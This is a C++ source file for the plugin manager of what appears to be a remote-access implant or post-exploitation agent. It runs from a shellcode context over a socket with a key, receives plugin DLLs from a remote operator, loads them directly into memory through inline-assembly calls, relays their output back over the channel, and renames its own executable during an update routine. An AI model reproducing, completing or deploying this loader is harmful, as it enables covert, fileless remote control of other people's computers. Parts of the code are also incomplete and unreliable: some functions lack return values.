#include <stdio.h>

#include "PluginManager.h"
#include "plugininterface.h"

bool WINAPI LoadLibraryFromMemory(PLoadLibraryFromMemory loadLib,SHELLCODE_CONTEXT* pSCC,
                                   const void *data, LPCWSTR dllname, PMEMORYMODULE result);
void WINAPI FreeLibraryFromMemory(PFreeLibraryFromMemory freeLib,SHELLCODE_CONTEXT* pSCC, PMEMORYMODULE module);

int __cdecl printf (const char*, ...);

class pluginEvent{
        PluginManager* PluginMgr;
        char* data;
        ulong size;
};

PluginManagerInterfacePrivate* PluginManager::pluginList;

class PluginManagerInterfacePrivate :public pluginManagerInterface{
        PluginManager* mgr;
        plugin* p;
    public:
        PluginManagerInterfacePrivate(PluginManager& mgr, plugin& p);
        plugin* getPlugInformation();
        virtual int sendData(const char* data,uint size);
        virtual int setErrorCode(uint code);
};

PluginManager::PluginManager(){
    pluginList = 0;
}

PluginManager::~PluginManager(){
    if(pluginList){
        printf("unloading plugin\n");
        ::FreeLibraryFromMemory(Context->FreeLibraryFromMemory,
                                Context,&pluginList->getPlugInformation()->Module);
    }
}

uint PluginManager::run(SHELLCODE_CONTEXT* Context){
    RPEP client(Context->hSocket,Context->hKey,this);
    protocol = &client;
    //printf("despues de client\n");

    this->Context = Context;

    //MessageBoxA(0, "PluginManager::run", "DLL Message", MB_OK | MB_ICONINFORMATION);
    return client.serverLoop();
}

bool PluginManager::updateServer(DArray& newServer){
    char FileName[1024];
    char FileNameNew[1024];
    long FilenameSize;
    FilenameSize = GetModuleFileName(0,FileName,sizeof(FileName)-1);

    strcpy(FileNameNew,FileName);
    FileNameNew[FilenameSize] = '_';
    FileNameNew[FilenameSize+1] = 0;

    MoveFile(FileName,FileNameNew);

    return true;
}
int exception(){
    return EXCEPTION_CONTINUE_SEARCH;
}
bool WINAPI LoadLibraryFromMemory(PLoadLibraryFromMemory loadLib,SHELLCODE_CONTEXT* pSCC,
                                   const void *data, LPCWSTR dllname, PMEMORYMODULE result){
    int status = 0;
    //printf("LoadLibraryFromMemory\n");

    __asm__ __volatile__(
        "push %ebx;push %edx;push %ecx;push %esi;push %edi;"
    );
    __asm__ (
                "push %5;"
                "push %4;"
                "push %3;"
                "push %2;"
                "call *(%1)":"=a"(status):
                "r"(&loadLib),
                "r"(pSCC),
                "r"(data),
                "r"(dllname),
                "r"(result)
    );
    __asm__ __volatile__(
        "pop %edi;pop %esi;pop %ecx;pop %edx;pop %ebx;"
    );

    return status;
}

void WINAPI FreeLibraryFromMemory(PFreeLibraryFromMemory freeLib,SHELLCODE_CONTEXT* pSCC, PMEMORYMODULE module){
    //printf("LoadLibraryFromMemory\n");

    __asm__ __volatile__(
        "push %eax;push %ebx;push %edx;push %ecx;push %esi;push %edi;"
    );
    __asm__ (
                "push %2;"
                "push %1;"
                "call *(%0)"::
                "r"(&freeLib),
                "r"(pSCC),
                "r"(module)
    );
    __asm__ __volatile__(
        "pop %edi;pop %esi;pop %ecx;pop %edx;pop %ebx;pop %eax"
    );
}

bool PluginManager::loadPlugin(RPEP_LOAD_PLUGIN* pluginModule){
    pgetInterface getInterface;
    //HINSTANCE hModule;
    plugin* newPlugin;
    ulong loadResult;
    PluginManagerInterfacePrivate* pluginPrivate;
    bool result = false;

    if(!isPluginLoad(pluginModule->PluginID)){
        printf("Cargando plugin....\n");
        newPlugin = new plugin();
        printf("newPlugin addr %x\n",(uint)newPlugin);
        //Cargamos el plugin
        {
            /*__asm__(
                "int3"
            );*/
            loadResult = ::LoadLibraryFromMemory(Context->LoadLibraryFromMemory,Context,pluginModule->PluginModule,L"",&newPlugin->Module);
        }
        if(loadResult){
            printf("modulo cargado con exito\n");
            //Buscamos las funciones exportadas
            getInterface = (pgetInterface)GetProcAddress(newPlugin->Module.ModuleBase,"getInterface");
            if((newPlugin->plugInterface = getInterface())){
                newPlugin->ID = pluginModule->PluginID;
                pluginPrivate = new PluginManagerInterfacePrivate(*this,*newPlugin);
                pluginList = pluginPrivate;
                result = true;
            }else delete newPlugin;
        }
    }else printf("ya cargado");

    printf("Cargado plugin: %s\n",result?"true":"false");
    return result;
}

plugin* PluginManager::getPluginById(ulong id){
    return pluginList->getPlugInformation();
}

RPEP *PluginManager::getProtocol(){
    return protocol;
}

bool PluginManager::isPluginLoad(ushort ID){
    bool result = false;
    if(pluginList && pluginList->getPlugInformation()){
        result = pluginList->getPlugInformation()->ID == ID;
    }
    return result;
}

PluginManagerInterfacePrivate::PluginManagerInterfacePrivate(PluginManager &mgr, plugin &p){
    this->mgr = &mgr;
    this->p = &p;
    p.plugInterface->setPluginManager(this);
}

plugin* PluginManagerInterfacePrivate::getPlugInformation(){
    return p;
}

int PluginManagerInterfacePrivate::sendData(const char *data, uint size){
    DArray buff;

    this->mgr->getProtocol()->MakePacket(buff,this->p->ID,data,size);

    return this->mgr->getProtocol()->send(buff.data,buff.size);
}

int PluginManagerInterfacePrivate::setErrorCode(uint code){
}


bool PluginManager::runPluginCMD(ulong pluginID, char *data, uint size){
    plugin* currentPlugin;
    if((currentPlugin = getPluginById(pluginID))){
         char buff[size+1];
         ZeroMemory(buff,size+1);
         memcpy(buff,data,size);
         printf("onReciveData size %x cadena %s\n",(uint)size,(char*)buff);

         currentPlugin->plugInterface->onReciveData(data,size);
    }
}
